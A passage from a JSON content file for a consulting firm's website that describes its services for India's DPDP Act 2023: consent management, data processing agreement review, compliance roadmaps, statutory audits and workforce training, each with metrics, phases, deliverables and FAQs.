        "value": "22 Languages",
        "label": "Eighth Schedule Ready",
        "sub": "Multilingual notices"
      },
      {
        "value": "Itemized",
        "label": "Granular Consent Capture",
        "sub": "Zero pre-ticked boxes"
      },
      {
        "value": "Immutable",
        "label": "Consent Audit Ledger",
        "sub": "Tamper-evident logs"
      },
      {
        "value": "Real-Time",
        "label": "Withdrawal Propagation",
        "sub": "Sub-processor syncing"
      }
    ],
    "frameworks": [
      "India DPDP Act 2023 (Section 6)",
      "MeitY Consent Architecture Specifications",
      "W3C Consent Specifications",
      "ISO/IEC 29184"
    ],
    "whyItMatters": {
      "title": "Bundled or Pre-Ticked Consent Is Legally Void Under Indian Law",
      "description": "Under Section 6 of the DPDP Act, consent must be free, specific, informed, unconditional, and unambiguous with a clear affirmative action. Any consent obtained through bundled terms or dark patterns is considered legally void from the beginning.",
      "points": [
        {
          "headline": "Mandatory Itemized Purpose Notices",
          "detail": "Users must be presented with specific, granular purposes for each category of personal data collected, with independent opt-in toggles."
        },
        {
          "headline": "Multi-Language Accessibility (22 Languages)",
          "detail": "The DPDP Act explicitly mandates that consent notices must be available in English and any of the 22 languages specified in the Eighth Schedule of the Constitution."
        },
        {
          "headline": "Ease of Withdrawal Equivalent to Giving Consent",
          "detail": "Withdrawing consent must be as effortless as granting it, triggering automated cascade deletion across marketing and analytics systems."
        }
      ]
    },
    "vectors": [
      {
        "category": "Consent Notice Design & Dark Pattern Elimination",
        "description": "Auditing user interfaces to remove coercive UI patterns and deploy compliant itemized notices.",
        "capabilities": [
          "Eliminating pre-ticked checkboxes and forced bundled consents",
          "Crafting itemized purpose statements in plain, simple language",
          "Implementing dynamic language switchers across 22 Eighth Schedule languages",
          "Configuring separate explicit consents for cross-border transfer or marketing"
        ]
      },
      {
        "category": "Immutable Consent Ledger & Telemetry Recording",
        "description": "Storing tamper-evident records of exact timestamps, notice versions, and IP addresses of consent grants.",
        "capabilities": [
          "Cryptographic hashing of consent grant transactions",
          "Logging exact notice text version presented at time of grant",
          "Capturing Data Principal identifier, method (SMS/OTP/Web/App), and timestamp",
          "Exporting audit-ready consent logs for Data Protection Board inquiries"
        ]
      },
      {
        "category": "Automated Consent Withdrawal & Erasure Cascade",
        "description": "Deploying API webhooks that propagate consent withdrawals immediately to downstream processors.",
        "capabilities": [
          "1-click self-service consent withdrawal portal deployment",
          "Automated webhook triggers to CRM, marketing, and analytics databases",
          "Real-time suppression list updates preventing unauthorized communications",
          "Selective consent modification (e.g. opt out of marketing while retaining service)"
        ]
      },
      {
        "category": "Consent Management Platform (CMP) Integration",
        "description": "Turnkey deployment and customization of enterprise CMP tools (OneTrust, Cookiebot, Custom APIs).",
        "capabilities": [
          "SDK deployment across iOS, Android, React, Vue, and Angular",
          "Cookie and local storage tracking script blocking prior to consent",
          "Backend microservice API integration via REST and GraphQL",
          "Unified cross-device consent synchronization"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Touchpoint Discovery & Audit",
        "title": "Consent Surface Mapping",
        "description": "Auditing all customer entry points, signup flows, checkout pages, and cookie banners.",
        "activities": [
          "UI dark pattern audit",
          "Data collection field inventory",
          "Purpose matrix definition"
        ]
      },
      {
        "step": "02",
        "phase": "Notice Drafting & Localization",
        "title": "Multilingual Notice Engineering",
        "description": "Authoring legally vetted, plain-language notices and translating them into required Eighth Schedule languages.",
        "activities": [
          "Legal notice authoring",
          "Professional regional translation",
          "Itemized toggle layout design"
        ]
      },
      {
        "step": "03",
        "phase": "CMP / Custom Engine Integration",
        "title": "Technical SDK & API Rollout",
        "description": "Deploying web and mobile SDKs, configuring script blockers, and establishing immutable consent storage databases.",
        "activities": [
          "Frontend SDK integration",
          "Pre-consent script blocking verification",
          "Consent database schema deployment"
        ]
      },
      {
        "step": "04",
        "phase": "Withdrawal & Downstream Webhook Sync",
        "title": "Erasure Cascade Automation",
        "description": "Connecting withdrawal webhooks to downstream databases, email marketing tools, and cloud storage.",
        "activities": [
          "API webhook configuration",
          "Downstream suppression testing",
          "Withdrawal SLA verification"
        ]
      },
      {
        "step": "05",
        "phase": "Testing & Attestation",
        "title": "Regulatory Readiness Verification",
        "description": "Executing simulated consent grant and withdrawal journeys, followed by issuing compliance attestations.",
        "activities": [
          "End-to-end user journey testing",
          "Auditor evidence export validation",
          "Compliance sign-off certificate"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Statutory Multilingual Consent Notice Suite",
        "format": "Formatted HTML / UI Mockups in 22 Languages",
        "audience": "Product Designers, Frontend Developers, Legal",
        "description": "Legally compliant itemized notices and granular opt-in toggle layouts translated into all required regional languages."
      },
      {
        "title": "Consent Architecture Technical Specification",
        "format": "Engineering Architecture Document",
        "audience": "Backend Engineers, Database Architects",
        "description": "API documentation, database schemas for consent ledgers, and webhook specifications for downstream synchronization."
      },
      {
        "title": "Consent Audit Trail Certification",
        "format": "Official Compliance Attestation",
        "audience": "Data Protection Board of India, Internal Audit",
        "description": "Formal certificate validating that your consent collection and withdrawal mechanisms adhere fully to Section 6 mandates."
      }
    ],
    "engagementModels": [
      {
        "name": "Turnkey CMP Implementation & Integration",
        "suitableFor": "Enterprises deploying OneTrust, Ketch, Securiti, or custom consent engines",
        "description": "Complete UI redesign, legal notice authoring, technical SDK deployment, and downstream webhook automation."
      },
      {
        "name": "Consent UI/UX Dark Pattern Audit",
        "suitableFor": "B2C e-commerce, banking, and mobile applications with existing signup flows",
        "description": "Focused audit identifying non-compliant pre-ticked boxes, forced bundling, and friction in withdrawal."
      },
      {
        "name": "Custom API-Driven Consent Ledger Engineering",
        "suitableFor": "High-scale platforms requiring sub-millisecond custom microservice consent storage",
        "description": "Designing private, scalable, cryptographic consent storage architectures integrated into your cloud backend."
      }
    ],
    "faqs": [
      {
        "question": "Can we still use a single 'I agree to the Terms and Conditions' checkbox?",
        "answer": "No. Under the DPDP Act 2023, bundling consent for personal data processing with acceptance of general Terms of Service is explicitly non-compliant. The consent request must be presented separately with specific, itemized purposes."
      },
      {
        "question": "Do we really have to translate consent notices into all 22 Indian regional languages?",
        "answer": "The DPDP Act mandates that the Data Principal must be given the option to access the notice and consent request in English or any of the 22 languages specified in the Eighth Schedule. If an Indian consumer requests Hindi, Tamil, or Bengali, your system must deliver it."
      },
      {
        "question": "How quickly must a consent withdrawal take effect across our systems?",
        "answer": "Withdrawals should take effect within a reasonable timeframe (typically immediately on marketing systems, and within mandated regulatory limits for backend suppression), ceasing all processing unless required by other statutory laws (like tax or banking records)."
      }
    ]
  },
  {
    "category": "dpdp",
    "categoryTitle": "DPDP Consulting",
    "id": "contract-review",
    "slug": "contract-review-dpa",
    "title": "Contract Review & Data Processing Agreements (DPA)",
    "navTitle": "Contract Review & Data Processing Agreements",
    "badge": "Contractual Privacy Governance",
    "tagline": "Lock Down Vendor Liability, Cross-Border Transfers, and Sub-Processor Obligations.",
    "heroSummary": "Comprehensive legal and technical review of commercial contracts, Master Services Agreements (MSAs), and Data Processing Agreements (DPAs). We ensure third-party processors, software vendors, and cloud providers carry enforceable DPDP Act 2023 obligations and strict liability indemnities.",
    "promise": "Watertight Commercial Privacy Contracts & Processor Governance",
    "metrics": [
      {
        "value": "100%",
        "label": "Contractual Alignment",
        "sub": "DPDPA 2023 Section 8"
      },
      {
        "value": "Zero-Risk",
        "label": "Liability Shielding",
        "sub": "Processor breach indemnities"
      },
      {
        "value": "Cross-Border",
        "label": "Transfer Safeguards",
        "sub": "Whitelisted territory rules"
      },
      {
        "value": "Standardized",
        "label": "Vendor DPA Templates",
        "sub": "Turnkey legal schedules"
      }
    ],
    "frameworks": [
      "India DPDP Act 2023 (Section 8)",
      "EU Standard Contractual Clauses (SCCs)",
      "ISO/IEC 27701",
      "Indian Contract Act 1872"
    ],
    "whyItMatters": {
      "title": "Under Indian Law, the Data Fiduciary Is Liable for Vendor Breaches",
      "description": "Section 8 of the DPDP Act states that a Data Fiduciary may only engage a Data Processor under a valid contract and remains primarily responsible for any breach or non-compliance committed by the processor.",
      "points": [
        {
          "headline": "Shield Your Organization from Vendor Negligence",
          "detail": "Ensure third-party processors carry explicit contractual liabilities, indemnities, and mandatory insurance for security lapses."
        },
        {
          "headline": "Enforce Rapid 24-Hour Breach Notification",
          "detail": "Legally mandate that vendors must notify you within 24 hours of suspected compromise so you can meet CERT-In and DPDB deadlines."
        },
        {
          "headline": "Regulate Cross-Border Data Transfers",
          "detail": "Ensure overseas cloud hosts and foreign parent companies comply with Central Government transfer restrictions and localized processing terms."
        }
      ]
    },
    "vectors": [
      {
        "category": "Data Processing Agreement (DPA) Drafting & Review",
        "description": "Authoring tailored DPA schedules and reviewing vendor-provided contractual addendums.",
        "capabilities": [
          "Defining explicit, restrictive processing scopes and purposes",
          "Mandating state-of-the-art encryption and access control requirements",
          "Prohibiting secondary data processing, profiling, or monetization by vendors",
          "Mandating prompt return and certified cryptographic deletion of data upon contract end"
        ]
      },
      {
        "category": "Sub-Processor Governance & Authorization Chains",
        "description": "Restricting the vendor's ability to outsource processing to unvetted downstream sub-contractors.",
        "capabilities": [
          "Prior written authorization clauses for adding new sub-processors",
          "Mandating equivalent contractual privacy terms down the entire supply chain",
          "Right to object to new sub-processors with contract termination remedies",
          "Quarterly updated sub-processor register maintenance requirements"
        ]
      },
      {
        "category": "Right-to-Audit & Independent Verification Clauses",
        "description": "Ensuring your enterprise retains the legal right to inspect and audit vendor security.",
        "capabilities": [
          "On-site and remote technical audit rights without unreasonable fee restrictions",
          "Mandatory submission of annual SOC 2 Type II and ISO 27001 reports",
          "Obligation to participate in joint incident response and tabletop exercises",
          "Mandatory sharing of penetration testing executive summaries"
        ]
      },
      {
        "category": "Cross-Border Data Transfer & Geopolitical Compliance",
        "description": "Evaluating contractual mechanisms for data routed to foreign cloud regions and offshore support.",
        "capabilities": [
          "Compliance with Central Government blacklisted territory notifications",
          "Enforcing localized storage requirements for sensitive financial or health records",
          "Drafting supplementary contractual guarantees for foreign cloud providers",
          "Evaluating foreign law enforcement access risks (e.g. US CLOUD Act)"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Contractual Inventory & Ingestion",
        "title": "Vendor Agreement Audit",
        "description": "Cataloging all existing MSAs, vendor contracts, and cloud terms of service currently in effect.",
        "activities": [
          "Contract collection and indexing",
          "Vendor criticality cross-referencing",
          "Missing DPA identification"
        ]
      },
      {
        "step": "02",
        "phase": "Gap Analysis & Redlining",
        "title": "Legal & Technical Review",
        "description": "Reviewing vendor DPAs against Section 8 DPDP obligations and redlining weak liability, audit, and breach notification terms.",
        "activities": [
          "Contractual redlining",
          "Liability cap negotiation support",
          "Security schedule optimization"
        ]
      },
      {
        "step": "03",
        "phase": "Standardized Master DPA Rollout",
        "title": "Enterprise DPA Templating",
        "description": "Authoring standardized Customer-facing and Vendor-facing DPAs approved by specialized cyber legal counsel.",
        "activities": [
          "Template DPA drafting",
          "Procurement team playbook authoring",
          "Negotiation fallback guideline creation"
        ]
      },
      {
        "step": "04",
        "phase": "Vendor Negotiation Support",
        "title": "Commercial Alignment",
        "description": "Supporting your procurement and legal teams during commercial negotiations with recalcitrant software vendors.",
        "activities": [
          "Direct vendor legal calls",
          "Compensating control clause drafting",
          "Executive risk sign-off"
        ]
      },
      {
        "step": "05",
        "phase": "Contract Governance Vault",
        "title": "Living Contract Repository",
        "description": "Maintaining a structured, searchable repository of all executed DPAs with automated renewal alerts.",
        "activities": [
          "Executed contract archiving",
          "Sub-processor monitoring",
          "Annual contract review schedule"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Standardized Enterprise Data Processing Agreement (DPA)",
        "format": "Production-Ready Word/PDF Contract",
        "audience": "Procurement, Legal Counsel, Enterprise Clients",
        "description": "Comprehensive, balanced DPA template aligned with India's DPDP Act 2023, ready for vendor and client execution."
      },
      {
        "title": "Vendor Contract Risk Assessment Matrix",
        "format": "Excel / Interactive Portal Matrix",
        "audience": "Chief Legal Officer, CISO, Head of Procurement",
        "description": "Granular scorecard evaluating every active vendor contract across liability caps, audit rights, and breach notification windows."
      },
      {
        "title": "Procurement Negotiation Playbook",
        "format": "Operational Legal Guide",
        "audience": "Vendor Management, Procurement Teams",
        "description": "Practical guide with pre-approved fallback clauses and compromise positions for commercial negotiations."
      }
    ],
    "engagementModels": [
      {
        "name": "Comprehensive Vendor Contract Overhaul",
        "suitableFor": "Enterprises with 20+ software and services vendors needing immediate DPA alignment",
        "description": "Inventorying, redlining, and renegotiating all active third-party contracts for DPDP Act compliance."
      },
      {
        "name": "Customer-Facing Enterprise DPA Drafting",
        "suitableFor": "B2B SaaS companies selling to Indian and global enterprise buyers",
        "description": "Drafting bulletproof, procurement-friendly DPAs that accelerate customer legal review cycles."
      },
      {
        "name": "Single High-Value Vendor Contract Due Diligence",
        "suitableFor": "Major outsourcing deals, core banking software acquisitions, or cloud migrations",
        "description": "Deep legal and technical scrutiny of a mission-critical supplier contract before signing."
      }
    ],
    "faqs": [
      {
        "question": "Why do we need a separate DPA if our vendor contract already has a confidentiality clause?",
        "answer": "Confidentiality clauses protect proprietary trade secrets between two companies. A DPA is legally required to govern personal data processing, outlining statutory obligations under the DPDP Act such as purpose limitation, breach notification, and deletion."
      },
      {
        "question": "What breach notification timeline should we demand from our vendors?",
        "answer": "In India, CERT-In mandates cybersecurity breach reporting within 6 hours, and the DPDP Act requires prompt notification to the Data Protection Board. Your vendor contracts should mandate notification within 12 to 24 hours of suspected compromise."
      },
      {
        "question": "Can a vendor limit their liability for data breaches to the fees paid under the contract?",
        "answer": "Vendors frequently attempt to cap liability to 12 months of software fees. However, given that statutory penalties under the DPDP Act can reach ₹250 Crores, we aggressively negotiate 'super-caps' or uncapped liability for intentional data misuse or severe gross negligence."
      }
    ]
  },
  {
    "category": "dpdp",
    "categoryTitle": "DPDP Consulting",
    "id": "dpdp-consulting",
    "slug": "dpdp-consulting",
    "title": "DPDP Compliance Consulting & Strategic Roadmap",
    "navTitle": "Consulting",
    "badge": "Enterprise Privacy Transformation",
    "tagline": "Turnkey Strategic Implementation of India's Digital Personal Data Protection Act 2023.",
    "heroSummary": "End-to-end strategic transformation guiding your enterprise from legal ambiguity to verified DPDP Act 2023 compliance. We bridge legal counsel with hands-on software engineering to overhaul data governance, consent mechanisms, security safeguards, and third-party risk.",
    "promise": "Comprehensive Organizational Transformation for DPDP Compliance",
    "metrics": [
      {
        "value": "360°",
        "label": "Full Enterprise Scope",
        "sub": "Legal, IT, HR & Product"
      },
      {
        "value": "0",
        "label": "Statutory Gaps",
        "sub": "Exhaustive legal alignment"
      },
      {
        "value": "Fast-Track",
        "label": "90-Day Roadmap",
        "sub": "Phased implementation"
      },
      {
        "value": "Board",
        "label": "Fiduciary Assurance",
        "sub": "Director liability protection"
      }
    ],
    "frameworks": [
      "India DPDP Act 2023",
      "MeitY Statutory Rules",
      "ISO/IEC 27701",
      "NIST Privacy Framework"
    ],
    "whyItMatters": {
      "title": "DPDP Compliance Requires Deep Technical and Legal Alignment",
      "description": "The DPDP Act is not just a legal document; it requires engineering changes to databases, consent banners, access controls, and retention scripts. Treating it solely as a legal project leaves massive technical exposure.",
      "points": [
        {
          "headline": "Unified Legal and Engineering Execution",
          "detail": "Our team combines privacy attorneys with hands-on cybersecurity engineers to write code, configure CMPs, and draft policies."
        },
        {
          "headline": "Protect Executive Officers from Personal Liability",
          "detail": "Demonstrate rigorous fiduciary compliance to protect Directors and Officers from regulatory enforcement actions."
        },
        {
          "headline": "Build Competitive Advantage Through Customer Trust",
          "detail": "Turn transparent data handling and instant consent management into a powerful brand differentiator."
        }
      ]
    },
    "vectors": [
      {
        "category": "Enterprise Privacy Governance Architecture",
        "description": "Designing the corporate governance structure, policies, and cross-functional privacy committees.",
        "capabilities": [
          "Privacy charter and executive steering committee establishment",
          "Comprehensive internal privacy policy manual drafting",
          "Roles and responsibilities definition (Fiduciary, Processor, Principal)",
          "Board of Directors compliance reporting cadence setup"
        ]
      },
      {
        "category": "Technical Security Safeguard Implementation",
        "description": "Translating Section 8 obligations into technical controls across cloud and databases.",
        "capabilities": [
          "Data-at-rest and data-in-transit encryption standard enforcement",
          "Role-based access control (RBAC) and least-privilege on PII databases",
          "Automated data masking and anonymization in test/staging environments",
          "Comprehensive security logging and tamper-proof audit trails"
        ]
      },
      {
        "category": "Consent, Notice & Privacy-by-Design Workflows",
        "description": "Embedding statutory compliance directly into product engineering roadmaps.",
        "capabilities": [
          "Itemized notice and consent capture redesign across all products",
          "Privacy-by-Design architectural review for new software features",
          "Automated data retention and disposal script configuration",
          "Cross-border data transfer compliance structuring"
        ]
      },
      {
        "category": "Data Principal Rights & Grievance Operations",
        "description": "Deploying automated workflows to process consumer requests without manual administrative burden.",
        "capabilities": [
          "Consumer rights portal deployment (Access, Correction, Erasure)",
          "Grievance redressal ticketing system integration with SLA alarms",
          "Statutory breach notification playbook authoring",
          "Employee and contractor privacy code of conduct implementation"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Maturity Assessment & Gap Analysis",
        "title": "Diagnostic Audit",
        "description": "Benchmarking current data collection, contracts, technical controls, and consent mechanisms against the DPDP Act.",
        "activities": [
          "Enterprise data audit",
          "Legal policy review",
          "Executive gap presentation"
        ]
      },
      {
        "step": "02",
        "phase": "Target Operating Model Design",
        "title": "Strategic Roadmap Blueprint",
        "description": "Formulating a prioritized 90-day transformation plan detailing legal, operational, and engineering milestones.",
        "activities": [
          "Transformation roadmap sign-off",
          "Budget and resource allocation",
          "Vendor prioritization"
        ]
      },
      {
        "step": "03",
        "phase": "Technical & Policy Rollout",
        "title": "Phased Implementation",
        "description": "Drafting policies, deploying consent banners, configuring database encryption, and updating vendor DPAs.",
        "activities": [
          "Policy publication",
          "Consent tooling integration",
          "Vendor contract renegotiation"
        ]
      },
      {
        "step": "04",
        "phase": "Operational Enablement & Training",
        "title": "Workforce Enablement",
        "description": "Training engineering, product, sales, and HR teams on everyday data privacy handling obligations.",
        "activities": [
          "Departmental privacy workshops",
          "Grievance officer coaching",
          "Mock breach simulation"
        ]
      },
      {
        "step": "05",
        "phase": "Compliance Audit & Certification",
        "title": "Final Attestation & Board Sign-Off",
        "description": "Conducting an exhaustive validation audit and presenting final compliance certificates to the Board.",
        "activities": [
          "Validation audit execution",
          "Board briefing delivery",
          "Compliance certificate issuance"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "DPDP Act 2023 Enterprise Compliance Blueprint",
        "format": "Comprehensive Master Strategy Document",
        "audience": "Board of Directors, CEO, CISO, General Counsel",
        "description": "Authoritative organizational roadmap documenting current maturity, target operating models, and closed legal/technical controls."
      },
      {
        "title": "Complete Corporate Privacy Policy Library",
        "format": "Standardized Policy Pack (Word/PDF)",
        "audience": "All Employees, Statutory Auditors",
        "description": "Tailored policies covering Data Protection, Consent Governance, Data Retention, Employee Privacy, and Incident Disclosure."
      },
      {
        "title": "Statutory Certificate of DPDP Compliance",
        "format": "Official Signed Attestation",
        "audience": "Data Protection Board of India, Enterprise Clients",
        "description": "Formal attestation verifying that enterprise systems and governance frameworks meet the requirements of the DPDP Act 2023."
      }
    ],
    "engagementModels": [
      {
        "name": "Full-Scope Enterprise DPDP Transformation",
        "suitableFor": "Large corporations, banks, healthcare groups, and multi-entity conglomerates",
        "description": "End-to-end consulting covering legal, technical, and operational overhaul across all business units."
      },
      {
        "name": "SaaS & High-Growth Startup Fast-Track (60 Days)",
        "suitableFor": "B2B SaaS and consumer tech scale-ups needing rapid compliance for funding or sales",
        "description": "Streamlined program focusing on rapid consent deployment, vendor DPAs, and core policy rollout."
      },
      {
        "name": "Retainer for Ongoing DPDP Regulatory Advisory",
        "suitableFor": "Certified enterprises maintaining ongoing alignment with evolving MeitY notifications",
        "description": "Continuous legal updates, quarterly gap reviews, and regulatory inquiry standby."
      }
    ],
    "faqs": [
      {
        "question": "How long does a full DPDP compliance transformation take?",
        "answer": "For mid-sized organizations, a focused fast-track transformation takes 60 to 90 days. For large enterprises with multiple legacy datastores and distributed business units, programs typically run across 3 to 6 months."
      },
      {
        "question": "What are the first steps an organization should take right now?",
        "answer": "The immediate priorities are: 1) conducting an internal data discovery audit to locate all PII, 2) unbundling consent checkboxes from Terms of Service, 3) establishing a formal Grievance Redressal mechanism, and 4) reviewing vendor DPAs."
      },
      {
        "question": "Does the DPDP Act apply to B2B companies that only process corporate data?",
        "answer": "Yes! B2B companies collect personal data of corporate employees, vendor representatives, job applicants, and website visitors. Furthermore, if you act as a Data Processor for enterprise clients, your clients will legally require you to prove DPDP compliance."
      }
    ]
  },
  {
    "category": "dpdp",
    "categoryTitle": "DPDP Consulting",
    "id": "dpdp-advisory-audit",
    "slug": "dpdp-advisory-audit",
    "title": "DPDPA Statutory Audit & Privacy Advisory",
    "navTitle": "Advisory & Audit",
    "badge": "Independent Statutory Audit",
    "tagline": "Independent Verification, Statutory Readiness Audits, and Executive Privacy Advisory.",
    "heroSummary": "Rigorous third-party compliance auditing and ongoing advisory evaluating your adherence to India's DPDP Act 2023. Our certified privacy auditors inspect technical databases, verify consent authenticity, review grievance logs, and issue independent audit attestations.",
    "promise": "Independent Statutory Privacy Assurance & Audit Defense",
    "metrics": [
      {
        "value": "Independent",
        "label": "Third-Party Audit",
        "sub": "Objective validation"
      },
      {
        "value": "Evidence",
        "label": "Backed Attestation",
        "sub": "Empirical control proof"
      },
      {
        "value": "Quarterly",
        "label": "Advisory Cadence",
        "sub": "Continuous regulatory updates"
      },
      {
        "value": "0",
        "label": "Audit Ambiguity",
        "sub": "Clear compliance scorecards"
      }
    ],
    "frameworks": [
      "India DPDP Act 2023",
      "ISO/IEC 27701 (Privacy Information Management)",
      "ISACA Privacy Audit Standards",
      "AICPA Privacy TSC"
    ],
    "whyItMatters": {
      "title": "Independent Audits Are Mandatory for Significant Data Fiduciaries",
      "description": "Under Section 10(2) of the DPDP Act, Significant Data Fiduciaries are statutorily required to appoint an independent data auditor to conduct periodic data audits evaluating adherence to the Act.",
      "points": [
        {
          "headline": "Statutory Defense in Case of Consumer Disputes",
          "detail": "An independent third-party audit report demonstrates reasonable security measures and good faith compliance before the Data Protection Board."
        },
        {
          "headline": "Uncover Implementation Blind Spots",
          "detail": "Internal teams often assume consent and deletion rules are working; our independent auditors test and verify data erasure in backend replicas."
        },
        {
          "headline": "Reassure Enterprise B2B Buyers",
          "detail": "Provide enterprise prospects with third-party audit reports certifying your compliance with Indian and global privacy standards."
        }
      ]
    },
    "vectors": [
      {
        "category": "Consent & Notice Verification Audit",
        "description": "Sample-based technical auditing of historical and active consent records.",
        "capabilities": [
          "Verifying affirmative consent action evidence across historical user signups",
          "Testing language selector functionality across regional languages",
          "Auditing cookie and tracker blocking efficacy prior to consent",
          "Inspecting consent withdrawal logging and timestamps"
        ]
      },
      {
        "category": "Technical Data Protection & Erasure Audit",
        "description": "Hands-on verification of cryptographic controls, access permissions, and data destruction.",
        "capabilities": [
          "Verifying data-at-rest encryption on production databases and backups",
          "Testing automated data deletion routines following retention expiry",
          "Auditing access logs for unauthorized internal PII viewing",
          "Verifying anonymization and pseudonymization irreversibility"
        ]
      },
      {
        "category": "Grievance Redressal Mechanism (GRM) Audit",
        "description": "Evaluating the operational speed and fairness of consumer privacy dispute resolution.",
        "capabilities": [
          "Auditing grievance response times against statutory ceilings",
          "Reviewing escalated complaints and resolution fairness",
          "Testing accessibility of grievance officer contact channels",
          "Auditing communication logs between the company and Data Principals"
        ]
      },
      {
        "category": "Third-Party Processor Oversight Audit",
        "description": "Verifying that third-party vendors and cloud hosts handle data in compliance with contracts.",
        "capabilities": [
          "Auditing vendor DPA execution completeness across all suppliers",
          "Reviewing vendor independent security audit certificates (SOC 2, ISO)",
          "Testing data return and deletion upon vendor termination",
          "Verifying cross-border data transfer restriction adherence"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Audit Planning & Scope Definition",
        "title": "Audit Universe Definition",
        "description": "Defining auditable entities, systems, databases, and third-party processing pipelines.",
        "activities": [
          "Audit charter approval",
          "Evidence request list distribution",
          "Sampling methodology definition"
        ]
      },
      {
        "step": "02",
        "phase": "Fieldwork & Technical Sampling",
        "title": "Evidence Collection & Testing",
        "description": "Extracting database records, testing consent banners, reviewing server configurations, and interviewing staff.",
        "activities": [
          "Technical control sampling",
          "Grievance log inspection",
          "Developer and HR interviews"
        ]
      },
      {
        "step": "03",
        "phase": "Non-Conformity Analysis",
        "title": "Gap Evaluation & Scoring",
        "description": "Benchmarking findings against DPDP statutory clauses and assigning severity classifications.",
        "activities": [
          "Legal non-conformity mapping",
          "Risk rating calculation",
          "Draft finding review with auditees"
        ]
      },
      {
        "step": "04",
        "phase": "Executive Debrief & RTP",
        "title": "Findings Presentation",
        "description": "Meeting with the CISO, Legal Counsel, and Executive Leadership to present non-conformities and remediation plans.",
        "activities": [
          "Executive presentation",
          "Corrective Action Plan (CAP) sign-off",
          "Remediation deadline assignment"
        ]
      },
      {
        "step": "05",
        "phase": "Final Report & Attestation",
        "title": "Formal Audit Issuance",
        "description": "Issuing the authoritative independent data audit report and compliance certificate.",
        "activities": [
          "Final statutory report delivery",
          "Audit certificate issuance",
          "Regulatory filing pack delivery"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Independent DPDP Act Statutory Audit Report",
        "format": "Comprehensive Formal PDF",
        "audience": "Data Protection Board of India, Board of Directors, External Auditors",
        "description": "Formal audit opinion documenting methodology, sampled evidence, control effectiveness, and non-conformities across all DPDP chapters."
      },
      {
        "title": "Executive Privacy Risk Maturity Scorecard",
        "format": "Executive Presentation",
        "audience": "CEO, Managing Director, Audit Committee",
        "description": "Quantitative maturity benchmarks across Governance, Consent, Rights Fulfillment, Technical Safeguards, and Vendor Risk."
      },
      {
        "title": "Certificate of Data Protection Audit",
        "format": "Official Signed Certificate",
        "audience": "Enterprise Clients, Regulators, Public Website",
        "description": "Official third-party attestation certifying that your enterprise has completed an independent statutory DPDP audit."
      }
    ],
    "engagementModels": [
      {
        "name": "Annual Statutory Independent Data Audit",
        "suitableFor": "Significant Data Fiduciaries and regulated enterprises requiring annual audits",
        "description": "Comprehensive statutory evaluation satisfying Section 10(2) audit requirements."
      },
      {
        "name": "Pre-Audit Health Check & Mock Inspection",
        "suitableFor": "Companies preparing for formal internal or external privacy audits",
        "description": "Rapid 2-week mock inspection identifying potential compliance violations before official audits."
      },
      {
        "name": "Quarterly Privacy Advisory & Surveillance Retainer",
        "suitableFor": "Organizations maintaining continuous alignment with evolving MeitY rules",
        "description": "Ongoing advisory, quarterly control sampling, and regulatory change tracking."
      }
    ],
    "faqs": [
      {
        "question": "What is the role of an independent data auditor under the DPDP Act?",
        "answer": "The independent data auditor evaluates whether a Significant Data Fiduciary complies with the provisions of the Act, including purpose limitation, consent validity, technical safeguards, and rights fulfillment, providing an objective audit report."
      },
      {
        "question": "What happens if the audit uncovers non-conformities?",
        "answer": "Our auditors classify findings into critical, high, and moderate observations and provide a Corrective Action Plan (CAP). We conduct a remediation re-testing phase to verify closed gaps before issuing the final clean audit attestation."
      },
      {
        "question": "How often should an independent privacy audit be conducted?",
        "answer": "For Significant Data Fiduciaries, statutory audits will be required periodically (typically annually). For all other organizations, an annual audit is best practice to satisfy enterprise clients and board governance."
      }
    ]
  },
  {
    "category": "dpdp",
    "categoryTitle": "DPDP Consulting",
    "id": "dpdpa-training",
    "slug": "dpdpa-training-programs",
    "title": "Training Programs for DPDPA Compliance",
    "navTitle": "Training Programs for DPDPA Compliance",
    "badge": "Workforce Privacy Enablement",
    "tagline": "Equip Engineers, HR, and Executives with Practical DPDPA 2023 Knowledge.",
    "heroSummary": "Role-based workforce training programs operationalizing India's Digital Personal Data Protection Act 2023. We deliver practical, scenario-driven masterclasses for Software Engineers (Privacy-by-Design), HR & Marketing teams (Consent & Customer Data), and CXOs (Fiduciary Governance).",
    "promise": "Measurable Workforce Privacy Competence & Compliance Certification",
    "metrics": [
      {
        "value": "Role-Based",
        "label": "Specialized Tracks",
        "sub": "Dev, HR, Legal, CXO"
      },
      {
        "value": "100%",
        "label": "Interactive Labs",
        "sub": "Real-world case studies"
      },
      {
        "value": "Certified",
        "label": "Employee Badging",
        "sub": "Verifiable credentials"
      },
      {
        "value": "DPDPA 2023",
        "label": "Current Law Aligned",
        "sub": "MeitY rules & penalties"
      }
    ],
    "frameworks": [
      "India DPDP Act 2023",
      "NIST Privacy Training Standards",
      "ISO/IEC 27701 Training Guidelines",
      "IAPP Certification Principles"
    ],
    "whyItMatters": {
      "title": "Human Error Causes 80% of Privacy Violations",
      "description": "A single software engineer hardcoding unencrypted PII into an analytics log, or a marketing manager downloading unconsented customer lists, can trigger devastating statutory penalties under the DPDP Act.",
      "points": [
        {
          "headline": "Instill Privacy-by-Design in Engineering",
          "detail": "Train software developers to implement data minimization, encryption, and automated deletion scripts as standard coding practices."
        },
        {
          "headline": "Eliminate Dark Patterns in Marketing & Sales",
          "detail": "Educate marketing teams on lawful consent capture, avoiding deceptive pre-ticked boxes, and honoring withdrawal requests."
        },
        {
          "headline": "Evidence of Compliance for Regulatory Defense",
          "detail": "Documented employee training records serve as essential statutory proof of reasonable organizational safeguards before the Data Protection Board."
        }
      ]
    },
    "vectors": [
      {
        "category": "Developer Track: Privacy-by-Design Engineering",
        "description": "Hands-on technical training for software architects, frontend/backend developers, and DevOps leads.",
        "capabilities": [
          "Implementing itemized consent gates and pre-consent script blocking",
          "Data minimization techniques in database schema design",
          "Automated cryptographic pseudonymization and tokenization",
          "Building self-service erasure and export APIs for Data Principals"
        ]
      },
      {
        "category": "Marketing & Sales Track: Lawful Customer Engagement",
        "description": "Practical guidance for growth marketing, lead generation, and customer support teams.",
        "capabilities": [
          "Lawful acquisition of marketing prospect databases under DPDP rules",
          "Eliminating dark patterns and deceptive consent prompts",
